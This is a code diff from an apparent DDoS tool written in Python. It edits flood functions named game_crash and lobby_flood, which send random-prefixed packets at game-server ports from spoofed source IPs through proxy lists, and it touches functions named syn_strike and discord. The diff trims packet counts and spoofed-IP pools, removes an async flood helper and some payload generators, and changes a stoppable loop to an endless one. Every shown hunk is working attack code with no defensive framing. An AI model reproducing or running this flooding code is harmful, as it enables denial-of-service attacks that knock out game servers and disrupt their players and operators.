@@ -1256,18 +1256,14 @@ def syn_strike(event, proxy_type, target_ip, target_port):
 
 def game_crash(event, proxy_type, target_ip, target_port):
     global proxies
-    common_game_ports = [25565, 27015, 7777, 19132]  # Minecraft, Source, Unreal, Bedrock
     payloads = [
-        generate_minecraft_payload(),
-        generate_source_payload(),
-        generate_unreal_payload(),
-        b"\xFF\xFF\xFF\xFF" + os.urandom(random.randint(64, 8192)),
-        b"\x00\x00" + os.urandom(random.randint(64, 8192)),
-        b"\xFE\xFD" + os.urandom(random.randint(64, 8192)),
+        b"\xFF\xFF\xFF\xFF" + os.urandom(32),
+        b"\x00\x00" + os.urandom(64),
+        b"\xFE\xFD" + os.urandom(16),
     ]
-    spoofed_sources = [spoof_source_ip() for _ in range(1000)]  # Increased spoofed IPs
+    spoofed_sources = [spoof_source_ip() for _ in range(50)]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
@@ -1280,61 +1276,46 @@ def game_crash(event, proxy_type, target_ip, target_port):
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.settimeout(1)  # Reduced timeout
-            target_port = target_port if target_port else random.choice(common_game_ports)
-            for _ in range(5000):  # Increased packet count
+            s.settimeout(2)
+            for _ in range(2000):
                 payload = Choice(payloads)
                 source_ip = Choice(spoofed_sources)
-                s.bind((source_ip, Intn(1024, 65535)))
                 s.sendto(payload, (target_ip, target_port))
-                time.sleep(0.001)  # Faster packet rate
+                s.bind((source_ip, Intn(1024, 65535)))
             s.close()
         except:
             if s:
                 s.close()
-            time.sleep(0.05)
-
-async def async_lobby_flood(s, target_ip, target_port, payloads, spoofed_sources):
-    try:
-        for _ in range(5000):  # Increased connection count
-            payload = Choice(payloads)
-            source_ip = Choice(spoofed_sources)
-            s.bind((source_ip, Intn(1024, 65535)))
-            s.send(payload)
-            if random.random() < 0.2:  # Increased reconnect rate
-                s.close()
-                s = setup_socket(proxy_type, proxy)
-                s.connect((target_ip, target_port))
-            await asyncio.sleep(0.001)  # Async delay
-    except:
-        if s:
-            s.close()
 
 def lobby_flood(event, proxy_type, target_ip, target_port):
     global proxies
     payloads = [
-        generate_minecraft_payload(),
-        generate_source_payload(),
-        b"\x01\x00" + os.urandom(random.randint(16, 256)),
-        b"\x02\x00" + os.urandom(random.randint(32, 512)),
-        b"\x00\x01" + os.urandom(random.randint(64, 1024)),
+        b"\x01\x00" + os.urandom(16),
+        b"\x02\x00" + os.urandom(32),
+        b"\x00\x01" + os.urandom(64),
     ]
-    spoofed_sources = [spoof_source_ip() for _ in range(1000)]  # Increased spoofed IPs
+    spoofed_sources = [spoof_source_ip() for _ in range(50)]
     event.wait()
-    while event.is_set():
+    while True:
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.settimeout(2)  # Reduced timeout
             s.connect((target_ip, target_port))
-            asyncio.run(async_lobby_flood(s, target_ip, target_port, payloads, spoofed_sources))
+            for _ in range(2000):
+                payload = Choice(payloads)
+                source_ip = Choice(spoofed_sources)
+                s.bind((source_ip, Intn(1024, 65535)))
+                s.send(payload)
+                if random.random() < 0.05:
+                    s.close()
+                    s = setup_socket(proxy_type, proxy)
+                    s.connect((target_ip, target_port))
             s.close()
         except:
             if s:
                 s.close()
-            time.sleep(0.05)
 
 def discord(event, proxy_type, target_ip, target_port):
     global proxies
